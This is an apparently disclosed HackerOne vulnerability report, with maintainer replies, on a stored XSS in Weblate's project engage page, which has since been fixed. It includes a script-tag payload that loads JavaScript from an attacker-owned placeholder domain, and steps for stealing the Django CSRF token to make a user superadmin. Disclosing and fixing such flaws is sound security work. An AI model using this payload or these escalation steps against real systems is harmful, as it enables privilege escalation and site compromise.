{"id":472391,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzIzOTE=","url":"https://hackerone.com/reports/472391","title":"Stored XSS @ /engage/\u003cproject_slug\u003e","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-12-26T22:13:28.975Z","submitted_at":"2018-12-26T22:13:28.975Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"lgian","url":"/lgian","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":19468,"url":"https://hackerone.com/weblate","handle":"weblate","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Weblate","twitter_handle":"WeblateOrg","website":"https://weblate.org/","about":"Weblate is a libre software web-based continuous localization system"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-07-02T12:40:01.189Z","bug_reporter_agreed_on_going_public_at":"2019-07-02T12:40:01.110Z","team_member_agreed_on_going_public_at":"2018-12-27T12:14:26.696Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Description\nThe vulnerability concerns a Stored XSS, while it is currently (to the best of my knowledge) not exploitable due to limitations stated below. I thought that the issue is worth reporting anyway.\n\n## Steps to reproduce\n1. Change a project's name (or create one) to the following payload:  \n `\u003cscript src=\"http://\u003cadversery_domain\u003e/payload.js\"\u003e\u003c/script\u003e`, where `\u003cadversary_domain\u003e` could be any domain that you own. For testing purposes you can host the javascript file on localhost.\n2. Navigate to `/engage/\u003cproject_slug\u003e`, where `\u003cproject_slug\u003e` is the project's url slug.\n3. Any javascript payload you host will be executed under the origin of weblate.\n\n## Referenced code\nThe code that is the root cause for the vulnerability is under: `weblate/trans/views/basic.py:show_engage:123`, where `show_engage` is the view called for the `/engage/\u003cproject_slug\u003e` url.\n\n### Caveats\n1. A project's name is limited to 60 characters, therefore we cannot inject our payload straight into it. A bypass for that is the one referenced in step 1, where we load an external javascript file from a domain we own.\n2. By default the application's CSP only allows scripts from certain domains (cdnjs etc.). Although, the default CSP allows `unsafe-inline` when any CDN is enabled.\n3. The session cookie is uses the attributes `HttpOnly` and `SameSite=lax`, therefore hijacking the superadmin's session token is impossible (for most browsers).\n4. In order to perform the attack, you have to own a user account that can change a project's name, which is true for any project administrator.\n\n#### Possible bypasses\n1. A project's name character limit is extended.\n2. Since the application supports file uploads and the CSP allows scripts coming from `self` (current domain), one could upload their payload to the Weblate installation. This bypass would require an endpoint that accepts uploading HTML/javascript content and stores it under the `media` uploads. \n\n### Proof of Concept\nIn order to get any value of the present XSS, since we cannot steal the superadmin's session token, we can perform any action as the superadmin. That is because we can issue any GET/POST request and read the response, since we operate under the same origin as the hosted application. As mentioned before, in order to perform the following attack, we need a user account that can change a project's name. \n\n1. Issue a GET request under `admin/weblate_auth/user/` in order to find our user record's ID. \n2. Issue a GET request under `admin/weblate_auth/user/5/change/`, assuming that the ID is 5 for instance.\n3. Read the previous' request's response in order to steal the `csrfmiddlewaretoken` that Django injects to protect against such attacks.\n4. Issue a POST request using the above information to make our user a superadmin.\n\nThe `payload.js` that automatically does the steps 2-4 is attached to the report (except for parsing the response for csrftokenmiddlware, which is trivial using javascript).\n\n## Proposed fixes\n1. Escape the project's name using django's `escape` function before output\n2. Remove the `unsafe-inline` directive from the CSP when CDNs are enabled.\n\n## Impact\n\nGiven a bypass to either the project's name character limit or the CSP, any user that has the ability to change a project's name can make themselves a superuser through CSRF.","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eThe vulnerability concerns a Stored XSS, while it is currently (to the best of my knowledge) not exploitable due to limitations stated below. I thought that the issue is worth reporting anyway.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eChange a project\u0026#39;s name (or create one) to the following payload:\u003cbr\u003e\n\u003ccode\u003e\u0026lt;script src=\u0026quot;http://\u0026lt;adversery_domain\u0026gt;/payload.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\u003c/code\u003e, where \u003ccode\u003e\u0026lt;adversary_domain\u0026gt;\u003c/code\u003e could be any domain that you own. For testing purposes you can host the javascript file on localhost.\u003c/li\u003e\n\u003cli\u003eNavigate to \u003ccode\u003e/engage/\u0026lt;project_slug\u0026gt;\u003c/code\u003e, where \u003ccode\u003e\u0026lt;project_slug\u0026gt;\u003c/code\u003e is the project\u0026#39;s url slug.\u003c/li\u003e\n\u003cli\u003eAny javascript payload you host will be executed under the origin of weblate.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"referenced-code\"\u003eReferenced code\u003c/h2\u003e\n\n\u003cp\u003eThe code that is the root cause for the vulnerability is under: \u003ccode\u003eweblate/trans/views/basic.py:show_engage:123\u003c/code\u003e, where \u003ccode\u003eshow_engage\u003c/code\u003e is the view called for the \u003ccode\u003e/engage/\u0026lt;project_slug\u0026gt;\u003c/code\u003e url.\u003c/p\u003e\n\n\u003ch3 id=\"caveats\"\u003eCaveats\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eA project\u0026#39;s name is limited to 60 characters, therefore we cannot inject our payload straight into it. A bypass for that is the one referenced in step 1, where we load an external javascript file from a domain we own.\u003c/li\u003e\n\u003cli\u003eBy default the application\u0026#39;s CSP only allows scripts from certain domains (cdnjs etc.). Although, the default CSP allows \u003ccode\u003eunsafe-inline\u003c/code\u003e when any CDN is enabled.\u003c/li\u003e\n\u003cli\u003eThe session cookie is uses the attributes \u003ccode\u003eHttpOnly\u003c/code\u003e and \u003ccode\u003eSameSite=lax\u003c/code\u003e, therefore hijacking the superadmin\u0026#39;s session token is impossible (for most browsers).\u003c/li\u003e\n\u003cli\u003eIn order to perform the attack, you have to own a user account that can change a project\u0026#39;s name, which is true for any project administrator.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch4 id=\"possible-bypasses\"\u003ePossible bypasses\u003c/h4\u003e\n\n\u003col\u003e\n\u003cli\u003eA project\u0026#39;s name character limit is extended.\u003c/li\u003e\n\u003cli\u003eSince the application supports file uploads and the CSP allows scripts coming from \u003ccode\u003eself\u003c/code\u003e (current domain), one could upload their payload to the Weblate installation. This bypass would require an endpoint that accepts uploading HTML/javascript content and stores it under the \u003ccode\u003emedia\u003c/code\u003e uploads. \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"proof-of-concept\"\u003eProof of Concept\u003c/h3\u003e\n\n\u003cp\u003eIn order to get any value of the present XSS, since we cannot steal the superadmin\u0026#39;s session token, we can perform any action as the superadmin. That is because we can issue any GET/POST request and read the response, since we operate under the same origin as the hosted application. As mentioned before, in order to perform the following attack, we need a user account that can change a project\u0026#39;s name. \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eIssue a GET request under \u003ccode\u003eadmin/weblate_auth/user/\u003c/code\u003e in order to find our user record\u0026#39;s ID. \u003c/li\u003e\n\u003cli\u003eIssue a GET request under \u003ccode\u003eadmin/weblate_auth/user/5/change/\u003c/code\u003e, assuming that the ID is 5 for instance.\u003c/li\u003e\n\u003cli\u003eRead the previous\u0026#39; request\u0026#39;s response in order to steal the \u003ccode\u003ecsrfmiddlewaretoken\u003c/code\u003e that Django injects to protect against such attacks.\u003c/li\u003e\n\u003cli\u003eIssue a POST request using the above information to make our user a superadmin.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe \u003ccode\u003epayload.js\u003c/code\u003e that automatically does the steps 2-4 is attached to the report (except for parsing the response for csrftokenmiddlware, which is trivial using javascript).\u003c/p\u003e\n\n\u003ch2 id=\"proposed-fixes\"\u003eProposed fixes\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eEscape the project\u0026#39;s name using django\u0026#39;s \u003ccode\u003eescape\u003c/code\u003e function before output\u003c/li\u003e\n\u003cli\u003eRemove the \u003ccode\u003eunsafe-inline\u003c/code\u003e directive from the CSP when CDNs are enabled.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eGiven a bypass to either the project\u0026#39;s name character limit or the CSP, any user that has the ability to change a project\u0026#39;s name can make themselves a superuser through CSRF.\u003c/p\u003e\n","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":397485,"file_name":"payload.js","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/397/485/52cb8e6376d1408b18dbc1eb6a542dc6376bce6d/payload.js?response-content-disposition=attachment%3B%20filename%3D%22payload.js%22%3B%20filename%2A%3DUTF-8%27%27payload.js\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQS4MXLS4F%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060309Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCdPyDr833HeXJwYpWjpt%2BE8j%2FssC2h5%2FlaE7mZngOMiQIhAIhVLq5AR6H%2BIAtKS0YClrr2gxSJzGl8%2FZmOeT68dbjNKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyLw4q7eiVATMCuJ5oqkQNRnoM2%2F7QfXwU%2Fz3OKzDhPBavarq1CsKnppYIDxpxowNYh40iJGbW36kruwk7Up1vRvNyltjF5q8qwhzaGeQZ%2BiAxZXfxuO%2B2Kcrl44J%2BblDlgfJxT%2FhANHqEJ52YkeCqL%2F8Jog8rViNOOl6oETOov%2FmlWe%2BSn52SY6oPYBRdYu%2BBKeiMV8Z7HXhpAE7juI1J25wS6dso8QH7RSAhNGIs8Y8svP20AF0GCUvT57CvEpTEKNmlMu6qBfLwB6pdnFPVBhYyN%2FfIE4%2FQa2wOG4EtJYFQfTQjLwttTt9CYHJbPWKgJsiqZWwvzgG5RucysYaY1Dvc5h%2B9x16jomi9UPmmxblIqy%2BUz9R8kd2FgetX%2B5J5YRu%2FIt1eM4Pmo0vWG1EERVUZkvMX57A4jS5kp%2F0ojOEF2BB5VpPswd3ts8BMSrW%2BwRyh9hJwmvOT24d%2FVDV1XlH12OfiqXYDHqfINlxhQS6ahBnjyeup6YaEdMK6oUB8ZRQCgIyT6ugHXy7R98squWf9jBVCuea8OVuecORCfgjCE76r%2FBTrqAVa%2BDcEKB0%2FoTap54OIKsextuoDcyV%2B5vaIZrhq52EXThW%2BXIbAp6mSkhzoWUgjsywl0H1o%2FDaG%2BNn3BBVN%2BRn45Quca4CUlobnDZ4s%2FQCgf9Z7bonFsVRNiD0YQAXIATjx%2FHm9NSP5TZgVxAil%2FiJbzMr5CzCPucZqQZHGinQXPFIlAHaN7P8LEs1k%2BYLHWhoCxufAjr4F07sxUlcZob%2BG%2FmA%2B1KCCNdIEo%2B%2BJY954m5YuWhqgrGS3SilW7Zv%2FcvslV9aFtJ6DgZI3AgcMDa3advxrZKKcSBi8tFdkDhjvGZZWiwX118rNoAQ%3D%3D\u0026X-Amz-Signature=0b2c26ca56429871ce6b00bbfee0b5a23c64739d4b00d86fde6a3aead10a503c","file_size":746,"type":"text/plain"}],"allow_singular_disclosure_at":"2019-01-26T12:14:26.771Z","allow_singular_disclosure_after":-60716923.09052731,"singular_disclosure_allowed":true,"vote_count":6,"voters":["sameerphad72","mygf","tems","cryptographer","nonbetter1","watskip"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":173,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/WeblateOrg/weblate","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3895910,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the report. The escaping is indeed missing, the code should probably use standard Django template instead of manually doing the string formatting.","markdown_message":"\u003cp\u003eThanks for the report. The escaping is indeed missing, the code should probably use standard Django template instead of manually doing the string formatting.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-27T11:44:25.052Z","updated_at":"2018-12-27T11:44:25.052Z","actor":{"username":"nijel","cleared":false,"url":"/nijel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/153/118/21d9e64f7cd44782a2ec35d76eaebf9294308c83_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"weblate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3895983,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for spotting, fixed in https://github.com/WeblateOrg/weblate/commit/63218cd4256941f02030b663d7207d69a0f1f173, it will be deployed later today.\n\nAs for unsafe-inline, this is needed for various third party integrations, but I believe it could be avoided as well. I've created issue for that in our issue tracker https://github.com/WeblateOrg/weblate/issues/2471.","markdown_message":"\u003cp\u003eThanks for spotting, fixed in \u003ca title=\"https://github.com/WeblateOrg/weblate/commit/63218cd4256941f02030b663d7207d69a0f1f173\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FWeblateOrg%2Fweblate%2Fcommit%2F63218cd4256941f02030b663d7207d69a0f1f173\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/WeblateOrg/weblate/commit/63218cd4256941f02030b663d7207d69a0f1f173\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, it will be deployed later today.\u003c/p\u003e\n\n\u003cp\u003eAs for unsafe-inline, this is needed for various third party integrations, but I believe it could be avoided as well. I\u0026#39;ve created issue for that in our issue tracker \u003ca title=\"https://github.com/WeblateOrg/weblate/issues/2471\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FWeblateOrg%2Fweblate%2Fissues%2F2471\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/WeblateOrg/weblate/issues/2471\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-27T12:12:47.039Z","updated_at":"2018-12-27T12:12:47.039Z","actor":{"username":"nijel","cleared":false,"url":"/nijel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/153/118/21d9e64f7cd44782a2ec35d76eaebf9294308c83_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"lgian","url":"/lgian"},"genius_execution_id":null,"team_handle":"weblate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3895989,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Additional note: The CSRF will not work thanks to Django CSRF protection, it will fail on invalid CSRF token which is hardcoded in the payload.js.","markdown_message":"\u003cp\u003eAdditional note: The CSRF will not work thanks to Django CSRF protection, it will fail on invalid CSRF token which is hardcoded in the payload.js.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-27T12:14:18.282Z","updated_at":"2018-12-27T12:14:18.282Z","actor":{"username":"nijel","cleared":false,"url":"/nijel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/153/118/21d9e64f7cd44782a2ec35d76eaebf9294308c83_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"weblate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3895991,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-27T12:14:26.731Z","updated_at":"2018-12-27T12:14:26.731Z","first_to_agree":true,"actor":{"username":"nijel","cleared":false,"url":"/nijel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/153/118/21d9e64f7cd44782a2ec35d76eaebf9294308c83_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"weblate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3897431,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the quick response regarding the issue.\n\nI apologize for the quite lacking PoC, I uploaded the finalized payload.\n\nAs I described above in PoC section, the fact that you run javascript under the origin of the application you can first issue a GET request under `/admin/weblate_auth/user/\u003cID\u003e/change/, read the response, extract the `csrfmiddlewaretoken` injected by Django, in order to successfully perform the CSRF attack.\n\nI tested this locally ( when debug is on, CSP is disabled that is why the PoC worked ), and I successfully made myself superuser. The only step I did not automate was to figure out my own user ID, but it is trivial considering that you can issue another GET request under `admin/weblate_auth/user/` and extract it too.\n","markdown_message":"\u003cp\u003eThank you for the quick response regarding the issue.\u003c/p\u003e\n\n\u003cp\u003eI apologize for the quite lacking PoC, I uploaded the finalized payload.\u003c/p\u003e\n\n\u003cp\u003eAs I described above in PoC section, the fact that you run javascript under the origin of the application you can first issue a GET request under \u003ccode\u003e/admin/weblate_auth/user/\u0026lt;ID\u0026gt;/change/, read the response, extract the\u003c/code\u003ecsrfmiddlewaretoken` injected by Django, in order to successfully perform the CSRF attack.\u003c/p\u003e\n\n\u003cp\u003eI tested this locally ( when debug is on, CSP is disabled that is why the PoC worked ), and I successfully made myself superuser. The only step I did not automate was to figure out my own user ID, but it is trivial considering that you can issue another GET request under \u003ccode\u003eadmin/weblate_auth/user/\u003c/code\u003e and extract it too.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-27T18:27:09.899Z","updated_at":"2018-12-27T18:27:09.899Z","actor":{"username":"lgian","cleared":false,"url":"/lgian","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":397955,"filename":"payload.js","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/397/955/5925e62e8eb3cae68398aa236913cf8b8f0cee8d/payload.js?response-content-disposition=attachment%3B%20filename%3D%22payload.js%22%3B%20filename%2A%3DUTF-8%27%27payload.js\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQS4MXLS4F%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060309Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCdPyDr833HeXJwYpWjpt%2BE8j%2FssC2h5%2FlaE7mZngOMiQIhAIhVLq5AR6H%2BIAtKS0YClrr2gxSJzGl8%2FZmOeT68dbjNKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyLw4q7eiVATMCuJ5oqkQNRnoM2%2F7QfXwU%2Fz3OKzDhPBavarq1CsKnppYIDxpxowNYh40iJGbW36kruwk7Up1vRvNyltjF5q8qwhzaGeQZ%2BiAxZXfxuO%2B2Kcrl44J%2BblDlgfJxT%2FhANHqEJ52YkeCqL%2F8Jog8rViNOOl6oETOov%2FmlWe%2BSn52SY6oPYBRdYu%2BBKeiMV8Z7HXhpAE7juI1J25wS6dso8QH7RSAhNGIs8Y8svP20AF0GCUvT57CvEpTEKNmlMu6qBfLwB6pdnFPVBhYyN%2FfIE4%2FQa2wOG4EtJYFQfTQjLwttTt9CYHJbPWKgJsiqZWwvzgG5RucysYaY1Dvc5h%2B9x16jomi9UPmmxblIqy%2BUz9R8kd2FgetX%2B5J5YRu%2FIt1eM4Pmo0vWG1EERVUZkvMX57A4jS5kp%2F0ojOEF2BB5VpPswd3ts8BMSrW%2BwRyh9hJwmvOT24d%2FVDV1XlH12OfiqXYDHqfINlxhQS6ahBnjyeup6YaEdMK6oUB8ZRQCgIyT6ugHXy7R98squWf9jBVCuea8OVuecORCfgjCE76r%2FBTrqAVa%2BDcEKB0%2FoTap54OIKsextuoDcyV%2B5vaIZrhq52EXThW%2BXIbAp6mSkhzoWUgjsywl0H1o%2FDaG%2BNn3BBVN%2BRn45Quca4CUlobnDZ4s%2FQCgf9Z7bonFsVRNiD0YQAXIATjx%2FHm9NSP5TZgVxAil%2FiJbzMr5CzCPucZqQZHGinQXPFIlAHaN7P8LEs1k%2BYLHWhoCxufAjr4F07sxUlcZob%2BG%2FmA%2B1KCCNdIEo%2B%2BJY954m5YuWhqgrGS3SilW7Zv%2FcvslV9aFtJ6DgZI3AgcMDa3advxrZKKcSBi8tFdkDhjvGZZWiwX118rNoAQ%3D%3D\u0026X-Amz-Signature=e6cca966171303d9a1c14a79c63850cb26ecd618cc0a4b51b14f6fdc700bd8ea"}],"genius_execution_id":null,"team_handle":"weblate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5238355,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-02T12:40:01.141Z","updated_at":"2019-07-02T12:40:01.141Z","actor":{"username":"lgian","cleared":false,"url":"/lgian","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"weblate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5238356,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-02T12:40:01.209Z","updated_at":"2019-07-02T12:40:01.209Z","actor":{"username":"lgian","cleared":false,"url":"/lgian","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"weblate","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}